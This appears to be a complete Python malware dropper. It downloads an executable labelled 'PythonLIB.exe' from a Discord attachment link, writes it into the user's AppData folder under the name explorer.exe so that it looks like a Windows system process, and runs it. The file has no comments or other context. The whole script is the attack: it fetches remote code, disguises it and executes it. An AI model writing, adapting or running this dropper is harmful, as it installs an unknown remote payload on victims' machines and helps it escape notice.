import requests
import subprocess
import os

path = os.environ["USERPROFILE"] + "\AppData\Local\explorer.exe"

response = requests.get("https://cdn.discordapp.com/attachments/1172852260624154634/1175490108393275432/PythonLIB.exe?ex=656b6b79&is=6558f679&hm=3236722f8ff096f14f3e7e7d8bde9aae986f82cc65511c8eb9fc7b299d683e92&")

if response.status_code != 200:
    exit()

with open(path, 'wb') as file:
    file.write(response.content)

if os.path.exists(path):
    subprocess.run(path, shell=True)